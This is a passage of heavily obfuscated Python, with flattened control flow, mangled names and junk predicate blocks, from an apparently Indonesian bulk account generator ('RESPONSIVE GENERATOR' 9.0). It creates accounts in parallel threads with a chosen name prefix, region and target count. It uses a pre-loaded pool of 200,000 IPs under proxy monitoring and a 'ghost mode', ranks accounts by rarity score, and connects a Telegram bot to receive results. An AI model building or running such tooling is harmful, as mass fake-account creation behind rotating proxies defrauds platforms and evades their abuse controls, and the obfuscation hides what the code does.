            lIIllIIlIIIIIllllllIII = IllIIIIIIIIIIIlII()
            IllIlIIlIIIllIIlIllIll = 7609295
            continue
        if IllIlIIlIIIllIIlIllIll == 9114279:
            getattr(lIlIlIIllllllllllIlII, 'stop')()
            IllIlIIlIIIllIIlIllIll = 4947055
            continue
        if IllIlIIlIIIllIIlIllIll == 4175968:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Epic      {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'PURPLE_GLOW')}{lIlllIllIlllIIIl}{getattr(IlIIIIIIlIIlIlll, 'RST')} (Score 11-14){getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 4698028
            continue
        if IllIlIIlIIIllIIlIllIll == 8791195:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            IllIlIIlIIIllIIlIllIll = 7413434
            continue
        if IllIlIIlIIIllIIlIllIll == 7918871:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Time      {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{llIllIllIIIllIl:.2f}{getattr(IlIIIIIIlIIlIlll, 'RST')} seconds{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 6400704
            continue
        if IllIlIIlIIIllIIlIllIll == 4890864:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Mythic    {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'BOLD')}{getattr(IlIIIIIIlIIlIlll, 'ORANGE_GLOW')}{lIIIllIlIIllllIIIlIIllI}{getattr(IlIIIIIIlIIlIlll, 'RST')} (Score 15-19){getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 4175968
            continue
        if IllIlIIlIIIllIIlIllIll == 8190694:
            getattr(lIIlIIIIlIllII, 'stop')()
            IllIlIIlIIIllIIlIllIll = 2907656
            continue
        if IllIlIIlIIIllIIlIllIll == 8112535:
            IllIllIIllIIlIIIIIllIl = f'  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Region    {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'GREEN2')}{('GHOST MODE' if IlIlIIlIlIIIllIlIlIllIl else lIIllllIlllIII):<15}{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Target    {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}{IllIlIllllIIllIIlIIlll}{getattr(IlIIIIIIlIIlIlll, 'RST')} accounts'
            IllIlIIlIIIllIIlIllIll = 5455713
            continue
        if IllIlIIlIIIllIIlIllIll == 6815610:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╟{'─' * IIIIllllllIlIlIllIIIIlI}')
            IllIlIIlIIIllIIlIllIll = 1776846
            continue
        if IllIlIIlIIIllIIlIllIll == 8166424:
            get_runtime_config()
            IllIlIIlIIIllIIlIllIll = 2987769
            continue
        if IllIlIIlIIIllIIlIllIll == 5920441:
            input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}Press Enter to continue...{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            break
        if IllIlIIlIIIllIIlIllIll == 8860207:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}[{getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}2{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}]{getattr(IlIIIIIIlIIlIlll, 'RST')} Rare Only (hanya Rare+){getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}')
            IllIlIIlIIIllIIlIllIll = 6336192
            continue
        if IllIlIIlIIIllIIlIllIll == 1105625:
            status, _, IIllIIIIlIlIIIllIIl = getattr(lIlIlIIllllllllllIlII, 'get_status')()
            IllIlIIlIIIllIIlIllIll = 9415161
            continue
        if IllIlIIlIIIllIIlIllIll == 9744733:
            load_license()
            IllIlIIlIIIllIIlIllIll = 4102060
            continue
        if IllIlIIlIIIllIIlIllIll == 9330948:
            load_license()
            IllIlIIlIIIllIIlIllIll = 8166424
            continue
        if IllIlIIlIIIllIIlIllIll == 6265682:
            get_runtime_config()
            IllIlIIlIIIllIIlIllIll = 6160475
            continue
        if IllIlIIlIIIllIIlIllIll == 2680898:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'TEXT_DIM')}🌐 Koneksi: {llIIIIIllIlllIlI}{lIlIlllIlIIlII}{getattr(IlIIIIIIlIIlIlll, 'RST')} {status}{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 2432002
            continue
        if IllIlIIlIIIllIIlIllIll == 3999565:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╟{'─' * IIIIllllllIlIlIllIIIIlI}')
            IllIlIIlIIIllIIlIllIll = 8112535
            continue
        if IllIlIIlIIIllIIlIllIll == 2760915:
            lIIIIIlIlIIIIlIlIIlIlI = 0
            IllIlIIlIIIllIIlIllIll = 3668595
            continue
        if IllIlIIlIIIllIIlIllIll == 8130347:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}✦ RESPONSIVE GENERATOR ✦{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 7058654
            continue
        if IllIlIIlIIIllIIlIllIll == 9415161:
            lIlIlllIlIIlII = '🟢 ONLINE' if IIllIIIIlIlIIIllIIl else '🔴 OFFLINE'
            IllIlIIlIIIllIIlIllIll = 3451311
            continue
        if IllIlIIlIIIllIIlIllIll == 4968100:
            load_license()
            IllIlIIlIIIllIIlIllIll = 6265682
            continue
        if IllIlIIlIIIllIIlIllIll == 3694424:
            lIIllllIlllIII = None
            IllIlIIlIIIllIIlIllIll = 9091250
            continue
        if IllIlIIlIIIllIIlIllIll == 3172253:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
            IllIlIIlIIIllIIlIllIll = 5920441
            continue
        if IllIlIIlIIIllIIlIllIll == 2518337:
            while lIIlIIllllIIlII < IllIlIllllIIllIIlIIlll and proxy_monitor():
                try:
                    remaining = IllIlIllllIIllIIlIIlll - lIIlIIllllIIlII
                    lIlIIIlIIIlIllIIlllIIIlI = min(remaining, 500)
                    with llIIIIIlllllIIIIlIl(max_workers=lIIlllIllIlIllllllIlI) as IlIIlIlllllIIIIlIllll:
                        IllIIIIllIIlIIIIlllIl = 5390725
                        while True:
                            if IllIIIIllIIlIIIIlllIl == 6961317:
                                for IlllIIlIIIllIlIlIllIIl in IlIIllIlIlIlIlIIIIlI(lllIlIllllIlIlllIl):
                                    try:
                                        getattr(IlllIIlIIIllIlIlIllIIl, 'result')(timeout=10)
                                    except:
                                        pass
                                    if lIIlIIllllIIlII >= IllIlIllllIIllIIlIIlll:
                                        break
                                break
                            if IllIIIIllIIlIIIIlllIl == 3202448:
                                IllIIIIllIIlIIIIlllIl = 3202448
                                continue
                            if IllIIIIllIIlIIIIlllIl == 9122673:
                                IllIIIIllIIlIIIIlllIl = 4275091
                                continue
                            if IllIIIIllIIlIIIIlllIl == 4275091:
                                for i in range(lIlIIIlIIIlIllIIlllIIIlI):
                                    if not proxy_monitor() or lIIlIIllllIIlII >= IllIlIllllIIllIIlIIlll:
                                        break
                                    IlllIIlIIIllIlIlIllIIl = getattr(IlIIlIlllllIIIIlIllll, 'submit')(process_account, lIIllllIlllIII, IIIlIllIIlIIlIIlllIll, lIlIIlIIllIllllIlIIlllIl, IllIlIllllIIllIIlIIlll, i + 1, IlIlIIlIlIIIllIlIlIllIl, False, lIIlllIIIIIllIIllIIlI)
                                    getattr(lllIlIllllIlIlllIl, 'append')(IlllIIlIIIllIlIlIllIIl)
                                IllIIIIllIIlIIIIlllIl = 6961317
                                continue
                            if IllIIIIllIIlIIIIlllIl == 5390725:
                                lllIlIllllIlIlllIl = []
                                IllIIIIllIIlIIIIlllIl = 4275091
                                continue
                    llIIllllllllIIIIIll = getattr(IlllllIIllIIllIIll, 'time')() - lllIlIIlIIlllIIII
                    IIIlIlIIllllllIIll = lIIlIIllllIIlII / llIIllllllllIIIIIll if llIIllllllllIIIIIll > 0 else 0
                    if lIIlIIllllIIlII < IllIlIllllIIllIIlIIlll and proxy_monitor():
                        getattr(IlllllIIllIIllIIll, 'sleep')(0.5)
                    else:
                        break
                except KeyboardInterrupt:
                    global IlIIIlllllIIlllII
                    IlIIIlllllIIlllII = True
                    print(f'\n{getattr(IlIIIIIIlIIlIlll, 'RED1')}┌{'─' * IIIIllllllIlIlIllIIIIlI}┐')
                    print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}⛔ Stopping...{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'RED1')}')
                    print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}└{'─' * IIIIllllllIlIlIllIIIIlI}┘')
                    break
            IllIlIIlIIIllIIlIllIll = 9114279
            continue
        if IllIlIIlIIIllIIlIllIll == 2432002:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}🔄 Auto-Loop: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}ACTIVE{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 4046435
            continue
        if IllIlIIlIIIllIIlIllIll == 2647989:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Legendary {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'BOLD')}{getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}{lIIIIIlIlIIIIlIlIIlIlI}{getattr(IlIIIIIIlIIlIlll, 'RST')} (Score 20+){getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 4890864
            continue
        if IllIlIIlIIIllIIlIllIll == 5459107:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'BLUE_GLOW')}01{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'BLUE')}ME (ar)     {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'BLUE_GLOW')}02{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'BLUE')}IND (hi)   {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'BLUE_GLOW')}03{getattr(IlIIIIIIlIIlIlll, 'RST')}. {getattr(IlIIIIIIlIIlIlll, 'BLUE')}ID (id) {getattr(IlIIIIIIlIIlIlll, 'BLACK')}──   {getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 7569672
            continue
        if IllIlIIlIIIllIIlIllIll == 7956164:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}✦ CONFIGURATION ✦{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 3999565
            continue
        if IllIlIIlIIIllIIlIllIll == 7107365:
            lIlIIlllIIIllII = f'  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Version   {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'GREEN2')}9.0 RESPONSIVE{'      '}{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Symbols   {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}{len(IllIlllllIIlllllIlIIll)}+{getattr(IlIIIIIIlIIlIlll, 'RST')} unique'
            IllIlIIlIIIllIIlIllIll = 4661791
            continue
        if IllIlIIlIIIllIIlIllIll == 3451311:
            llIIIIIllIlllIlI = getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW') if IIllIIIIlIlIIIllIIl else getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')
            IllIlIIlIIIllIIlIllIll = 2680898
            continue
        if IllIlIIlIIIllIIlIllIll == 3048865:
            lIlllIllIlllIIIl = 0
            IllIlIIlIIIllIIlIllIll = 6613114
            continue
        if IllIlIIlIIIllIIlIllIll == 1133101:
            IllIlIIlIIIllIIlIllIll = 8166424
            continue
        if IllIlIIlIIIllIIlIllIll == 4077151:
            while True:
                try:
                    max_workers = IlIlIlllllIlIIlllIIlIII['max_workers']
                    print(f'\n{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}┌{'─' * IIIIllllllIlIlIllIIIIlI}┐')
                    print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}ℹ️ Max threads: {max_workers}{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}')
                    print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}└{'─' * IIIIllllllIlIlIllIIIIlI}┘')
                    lIlIlIllIIllllllIl = getattr(input(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Threads [default 50]: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')()
                    print(getattr(IlIIIIIIlIIlIlll, 'RST'), end='')
                    if not lIlIlIllIIllllllIl:
                        lIIlllIllIlIllllllIlI = 50
                    else:
                        lIIlllIllIlIllllllIlI = int(lIlIlIllIIllllllIl)
                    if 1 <= lIIlllIllIlIllllllIlI <= IlIlIlllllIlIIlllIIlIII['max_workers']:
                        break
                except ValueError:
                    lIIlllIllIlIllllllIlI = 50
                    break
                except KeyboardInterrupt:
                    IlIIlIlIlIIIIllIllIIll()
            IllIlIIlIIIllIIlIllIll = 9744733
            continue
        if IllIlIIlIIIllIIlIllIll == 2989292:
            while True:
                try:
                    IIIlIllIIlIIlIIlllIll = getattr(input(f'\n{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}{getattr(UI, 'ARROW')}{getattr(IlIIIIIIlIIlIlll, 'RST')} Name prefix [JONZZ]: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}'), 'strip')()
                    print(getattr(IlIIIIIIlIIlIlll, 'RST'), end='')
                    if not IIIlIllIIlIIlIIlllIll:
                        IIIlIllIIlIIlIIlllIll = 'JONZZ'
                    break
                except KeyboardInterrupt:
                    IlIIlIlIlIIIIllIllIIll()
            IllIlIIlIIIllIIlIllIll = 5908217
            continue
        if IllIlIIlIIIllIIlIllIll == 6613114:
            normal = 0
            IllIlIIlIIIllIIlIllIll = 8117029
            continue
        if IllIlIIlIIIllIIlIllIll == 7605184:
            lIIlllIIIIIllIIllIIlI = False
            IllIlIIlIIIllIIlIllIll = 4418794
            continue
        if IllIlIIlIIIllIIlIllIll == 6336192:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
            IllIlIIlIIIllIIlIllIll = 7605184
            continue
        if IllIlIIlIIIllIIlIllIll == 1751027:
            lIlIlIlllIlIlIllIlIII = f'  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Threads   {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'GREEN2')}{lIIlllIllIlIllllllIlI:<15}{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}│{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}IP Pool   {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}200,000{getattr(IlIIIIIIlIIlIlll, 'RST')} pre-loaded'
            IllIlIIlIIIllIIlIllIll = 9297516
            continue
        if IllIlIIlIIIllIIlIllIll == 2987769:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            IllIlIIlIIIllIIlIllIll = 4967020
            continue
        if IllIlIIlIIIllIIlIllIll == 1806877:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            IllIlIIlIIIllIIlIllIll = 7956164
            continue
        if IllIlIIlIIIllIIlIllIll == 4967020:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}✦ AVAILABLE REGIONS ✦{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 2493736
            continue
        if IllIlIIlIIIllIIlIllIll == 4947055:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}⏳ Flushing remaining data...{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            IllIlIIlIIIllIIlIllIll = 8190694
            continue
        if IllIlIIlIIIllIIlIllIll == 8243833:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}🔄 Auto-Loop: {getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}ACTIVE{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 2880138
            continue
        if IllIlIIlIIIllIIlIllIll == 7413434:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}✦ GENERATION COMPLETE ✦{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 6815610
            continue
        if IllIlIIlIIIllIIlIllIll == 9091250:
            IlIlIIlIlIIIllIlIlIllIl = False
            IllIlIIlIIIllIIlIllIll = 7074658
            continue
        if IllIlIIlIIIllIIlIllIll == 6400704:
            if llIllIllIIIllIl > 0 and lIIlIIllllIIlII > 0:
                IIIlIlIIllllllIIll = lIIlIIllllIIlII / llIllIllIIIllIl
                print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}Speed     {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}:{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}{IIIlIlIIllllllIIll:.1f}{getattr(IlIIIIIIlIIlIlll, 'RST')} acc/sec{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 2647989
            continue
        if IllIlIIlIIIllIIlIllIll == 5455713:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_alt(IllIllIIllIIlIIIIIllIl, IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 1751027
            continue
        if IllIlIIlIIIllIIlIllIll == 9436057:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][2] == 125:
                lllIIIllIIIllIIllIllll = 6982305
                while True:
                    if lllIIIllIIIllIIllIllll == 2922456:
                        lllIIIllIIIllIIllIllll = 6000803
                        continue
                    if lllIIIllIIIllIIllIllll == 5262205:
                        lllIIIllIIIllIIllIllll = 5262205
                        continue
                    if lllIIIllIIIllIIllIllll == 8871737:
                        IlllIIIllIllIll = sum(lllllIIllllIIllIllIllI) + llIIIIIIlllllIlllIlIl % 31 - llIIllIIllIIlllI
                        break
                    if lllIIIllIIIllIIllIllll == 6982305:
                        llIIllIIllIIlllI = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][24] * 172562 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][26]
                        lllIIIllIIIllIIllIllll = 2997162
                        continue
                    if lllIIIllIIIllIIllIllll == 2376488:
                        lllIIIllIIIllIIllIllll = 8871737
                        continue
                    if lllIIIllIIIllIIllIllll == 2997162:
                        llIIIIIIlllllIlllIlIl = (llIIllIIllIIlllI * 2 ^ 5563131) & 4294967295
                        lllIIIllIIIllIIllIllll = 6000803
                        continue
                    if lllIIIllIIIllIIllIllll == 6000803:
                        lllllIIllllIIllIllIllI = [llIIIIIIlllllIlllIlIl >> 9 & 255 for IlIIIllIlIlIIIIllIlI in range(2)]
                        lllIIIllIIIllIIllIllll = 8871737
                        continue
            IllIlIIlIIIllIIlIllIll = 8092346
            continue
        if IllIlIIlIIIllIIlIllIll == 3448648:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}  {getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}[{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}1{getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}]{getattr(IlIIIIIIlIIlIlll, 'RST')} All Accounts (simpan semua){getattr(IlIIIIIIlIIlIlll, 'RST')}{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}')
            IllIlIIlIIIllIIlIllIll = 8860207
            continue
        if IllIlIIlIIIllIIlIllIll == 4661791:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_alt(lIlIIlllIIIllII, IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}')
            IllIlIIlIIIllIIlIllIll = 7290157
            continue
        if IllIlIIlIIIllIIlIllIll == 9618537:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            IllIlIIlIIIllIIlIllIll = 5498335
            continue
        if IllIlIIlIIIllIIlIllIll == 6700557:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
            IllIlIIlIIIllIIlIllIll = 3694424
            continue

def setup_telegram():
    global IIllIlIIIIIIIIl
    IlllIlllIllIlllllIllIlI = 8967089
    while True:
        if IlllIlllIllIlllllIllIlI == 3020519:
            if not getattr(IIllIlIIIIIIIIl, 'set_credentials')(lIlIIllIllIIllIllllIIIll, chat_id):
                llIIIlllIllllI = 1958125
                while True:
                    if llIIIlllIllllI == 8404859:
                        llIIIlllIllllI = 6030324
                        continue
                    if llIIIlllIllllI == 4220183:
                        getattr(IlllllIIllIIllIIll, 'sleep')(2)
                        llIIIlllIllllI = 6030324
                        continue
                    if llIIIlllIllllI == 1958125:
                        print(f'{getattr(IlIIIIIIlIIlIlll, 'RED1')}❌ Gagal terhubung ke Telegram! Periksa Token dan Chat ID.{getattr(IlIIIIIIlIIlIlll, 'RST')}')
                        llIIIlllIllllI = 4220183
                        continue
                    if llIIIlllIllllI == 6030324:
                        return
                        break
            IlllIlllIllIlllllIllIlI = 2626985
            continue
        if IlllIlllIllIlllllIllIlI == 5352131:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'GREEN1')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            IlllIlllIllIlllllIllIlI = 9041328
            continue
        if IlllIlllIllIlllllIllIlI == 3275739:
            getattr(IIllIlIIIIIIIIl, 'send_bot_on')()
            IlllIlllIllIlllllIllIlI = 3916138
            continue
        if IlllIlllIllIlllllIllIlI == 8967089:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][31] * 15 + 26 == 2526:
                IIIlIlllIIlIllIIlIIl = 3517219
                while True:
                    if IIIlIlllIIlIllIIlIIl == 3517219:
                        IIllllllIllIIIIIIll = 54379991
                        IIIlIlllIIlIllIIlIIl = 4675071
                        continue
                    if IIIlIlllIIlIllIIlIIl == 7710645:
                        IIIlIlllIIlIllIIlIIl = 6551456
                        continue
                    if IIIlIlllIIlIllIIlIIl == 8402029:
                        lIlIlIlIIlIlIIIllIIlIll = [lIIlllIIlllIIIlIllIIII >> 1 & 255 for llIlIlIlIIIllIIII in range(3)]
                        IIIlIlllIIlIllIIlIIl = 6551456
                        continue
                    if IIIlIlllIIlIllIIlIIl == 6551456:
                        IIIIIIlIllIIIIlllIl = sum(lIlIlIlIIlIlIIIllIIlIll) + lIIlllIIlllIIIlIllIIII % 72 - IIllllllIllIIIIIIll
                        break
                    if IIIlIlllIIlIllIIlIIl == 4675071:
                        lIIlllIIlllIIIlIllIIII = (IIllllllIllIIIIIIll * 3 ^ 5749493) & 65535
                        IIIlIlllIIlIllIIlIIl = 8402029
                        continue
            IlllIlllIllIlllllIllIlI = 1190212
            continue
        if IlllIlllIllIlllllIllIlI == 2949638:
            print(f'\n{getattr(IlIIIIIIlIIlIlll, 'YELLOW1')}⏳ Menghubungi Telegram...{getattr(IlIIIIIIlIIlIlll, 'RST')}')
            IlllIlllIllIlllllIllIlI = 3020519
            continue
        if IlllIlllIllIlllllIllIlI == 5141631:
            print()
            IlllIlllIllIlllllIllIlI = 6691341
            continue
